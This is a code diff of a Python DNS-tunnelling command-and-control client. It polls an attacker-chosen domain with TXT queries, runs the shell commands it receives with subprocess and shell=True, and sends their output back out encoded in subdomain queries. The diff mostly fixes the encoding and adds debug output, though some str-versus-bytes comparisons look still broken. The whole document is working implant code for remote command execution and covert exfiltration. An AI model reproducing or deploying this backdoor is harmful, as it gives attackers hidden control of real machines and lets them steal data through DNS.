@@ -67,48 +67,56 @@ def main():
         running = True
         while running:
             sleep(args.timeout)
-            subd = encode32("CHK" + str(datetime.datetime.now())) # check in for commands
+            subd = b"CHK" + encode32(str(datetime.datetime.now())) # check in for commands
             if subd.endswith(b"-"): subd += b"0" # can't end a subdomain with "-"
             answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
-            answer = decode64(answer[0].to_text())[:3]
+            answer = answer[0].to_text().replace('"','') # avoid quotes in answer
             msgType = answer[:3]
+            print(f"{OR}answer is {OV}{answer}{OR}, and it's {OV}{len(answer)}{OR} bytes long{OM}")
+            if len(answer) > 3: answer = decode64(answer[3:]).decode('UTF8')
+            if debuggin: print(f"{OV}Received answer {OR}{answer}{OV} of type {OR}{msgType}{OM}")
             if msgType == "NUL": # nop if nothing from server
                 if debuggin: print(f"{OV}NUL from server{OM}")
             elif msgType == "DIE": # stop if told so
                 print(f"{OR}DIE message received; I'm out{OM}")
                 running = False
             elif msgType == "HDR": # command header; process
-                if debuggin: print(f"{OV}HDR from server{OM}")
-                cmdPktCt = int(answer[3:]) # how many lines long is the command?
-                command = ""
+                if debuggin: print(f"{OV}HDR from server, answer is {OR}{answer}{OM}")
+                cmdPktCt = int(answer) # how many lines long is the command?
+                print(f"{OR}Command is {OV}{cmdPktCt}{OR} chunks long{OR}")
+                command = b""
                 for i in range(cmdPktCt): # get all lines
-                    subd = encode32("CON" + str(datetime.datetime.now()))
-                    answer = res.query(subd + args.domain, "TXT")
-                    answer = decode64(answer[0].to_text())[:3]
+                    subd = b"CON" + encode32(str(datetime.datetime.now()))
+                    answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
+                    answer = answer[0].to_text()
                     msgType = answer[:3]
-                    command += answer[3:]
+                    command += decode64(answer[3:])
                 # output = subprocess.check_output("cat /etc/services", shell=True)
-                output = subprocess.check_output(command, shell=True)
+                print(f"{OR}Executing command {OV}{command.decode('UTF8')}{OR}")
+                output = subprocess.check_output(command.decode("UTF8"), shell=True)
+                print(f"{OR}Command output: {OV}{output}{OM}")
                 codedOutput = encode32(output)
-                respPktCt = int(codedOutput / 57) + 1 # number of packets to send response
-                subd = encode("HDR" + str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
-                answer = res.query(subd + args.domain, "TXT")
-                answer = decode(answer[0].to_text())[:3]
+                respPktCt = int(len(codedOutput) / 57) + 1 # number of packets to send response
+                subd = b"HDR" + encode32(str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
+                answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
+                answer = answer[0].to_text()
                 msgType = answer[:3]
-                chunks = wrap(output,57)
-                if msgType != "ACK":
-                    error = f"Expected 'ACK' from server, got {msgType}"
+                chunks = wrap(codedOutput.decode('UTF8'),55)
+                if msgType != b"ACK":
+                    error = f"Expected b'ACK' from server, got {msgType}"
                     print(OE + error + OM)
                     raise Exception(error)
                 for chunk in chunks:
                     # subd = encode32("RES" + hex(i)[-2:] + chunk)
-                    subd = encode32("RES" + chunk)
+                    subd = b"RES" + encode32(chunk.encode('UTF8'))
                     if subd.endswith(b"-"): subd += b"0" # can't start/end subdomain with "-"
-                    if subd.startswith(b"-"): subd = b"0" + subd
-                    answer = res.query(subd + args.domain, "TXT")
+                    # if subd.startswith(b"-"): subd = b"0" + subd
+                    print(f"{OR}Chunk looks like {OV}{chunk}{OR}; there are {OV}{len(chunks)}{OR} chunks.{OM}")
+                    print(f"{OR}subd looks like {OV}{subd}{OM}")
+                    answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
                     # if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
-                    if decode64(answer[0].to_text())[:3] != "ACK":
-                        error = f"Expected 'ACK' from server, got {decode64(answer[0].to_text())[:5]}"
+                    if answer[0].to_text()[:3] != b"ACK":
+                        error = f"Expected b'ACK' from server, got {decode64(answer[0].to_text())[:5]}"
                         print(OE + error + OM)
                         raise Exception(error)
     except KeyboardInterrupt:
